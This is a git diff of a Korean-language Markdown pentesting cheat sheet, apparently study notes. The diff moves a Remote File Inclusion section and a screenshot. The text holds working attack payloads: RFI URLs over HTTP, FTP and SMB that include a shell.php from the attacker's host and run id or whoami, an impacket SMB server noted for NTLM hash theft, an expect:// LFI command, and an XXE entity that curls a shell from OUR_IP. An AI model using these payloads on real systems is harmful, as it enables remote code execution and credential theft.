@@ -340,50 +340,6 @@ extension=expect
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
 
-</details>
-
----
-
-<details>
-<summary><strong>RFI (Remote File Inclusion)</strong></summary>
-
-## RFI (Remote File Inclusion)
-
-> 외부 서버의 악성 파일을 포함시켜 실행하는 공격 기법입니다.
-
-### 기본 RFI 공격
-
-#### HTTP를 통한 원격 파일 포함
-```bash
-# 로컬 서버의 파일 포함 (테스트)
-http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
-
-# 공격자 서버의 악성 파일 포함
-http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
-```
-
----
-
-### FTP를 통한 원격 파일 포함
-```bash
-# FTP 서버 실행 (Python pyftpdlib 사용)
-sudo python3 -m pyftpdlib -p 21
-
-# FTP를 통한 파일 포함
-http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
-```
-
----
-
-### SMB를 통한 원격 파일 포함 (Windows)
-```bash
-# Impacket의 smbserver.py 실행(NTLM 해시 탈취 가능)
-impacket-smbserver -smb2support share $(pwd)
-
-# SMB를 통한 파일 포함
-http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
-```
-
 ---
 
 ### 로그 파일 포함 (Log Poisoning)
@@ -478,6 +434,51 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
 **Log poisoning 예시:**
 
 <img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />
+
+
+</details>
+
+---
+
+<details>
+<summary><strong>RFI (Remote File Inclusion)</strong></summary>
+
+## RFI (Remote File Inclusion)
+
+> 외부 서버의 악성 파일을 포함시켜 실행하는 공격 기법입니다.
+
+### 기본 RFI 공격
+
+#### HTTP를 통한 원격 파일 포함
+```bash
+# 로컬 서버의 파일 포함 (테스트)
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+# 공격자 서버의 악성 파일 포함
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+---
+
+### FTP를 통한 원격 파일 포함
+```bash
+# FTP 서버 실행 (Python pyftpdlib 사용)
+sudo python3 -m pyftpdlib -p 21
+
+# FTP를 통한 파일 포함
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+
+---
+
+### SMB를 통한 원격 파일 포함 (Windows)
+```bash
+# Impacket의 smbserver.py 실행(NTLM 해시 탈취 가능)
+impacket-smbserver -smb2support share $(pwd)
+
+# SMB를 통한 파일 포함
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
 
 ---
 
@@ -764,6 +765,7 @@ done
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
 ```
+<img width="1519" height="584" alt="image" src="https://github.com/user-attachments/assets/6b8534fb-d906-45a5-8db1-81a499d49926" />
 
 ---
 
@@ -784,7 +786,6 @@ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
   %xxe;
 ]>
 ```
-<img width="1519" height="584" alt="image" src="https://github.com/user-attachments/assets/6b8534fb-d906-45a5-8db1-81a499d49926" />
 
 ---
 
